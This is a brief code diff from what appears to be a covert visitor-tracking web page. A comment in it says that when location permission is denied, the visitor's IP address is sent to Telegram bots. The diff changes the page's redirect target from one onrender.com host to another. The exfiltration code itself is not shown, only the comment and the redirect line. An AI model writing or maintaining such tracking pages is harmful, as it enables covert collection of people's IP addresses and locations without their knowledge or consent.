@@ -15,7 +15,7 @@
           // Location permission denied, send IP result to Telegram bots
         
 //////1//////
-          window.location.href = 'https://bigy9.onrender.com/'; 
+          window.location.href = 'https://bigy10.onrender.com/'; 
 //////1//////
         }
       }
